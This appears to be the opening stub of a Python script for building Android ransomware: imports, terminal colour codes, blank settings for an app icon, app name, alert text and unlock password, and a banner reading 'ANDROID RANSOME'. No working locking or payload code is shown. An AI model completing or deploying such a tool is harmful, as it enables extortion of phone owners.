#!/usr/bin/env python3

# imports
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image

# colors
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"


app_icon = ""
app_name = ""
alert_title = ""
alert_desc = ""
key_pass = ""

def banner():
        print(w+b+" ANDROID RANSOME "+w)

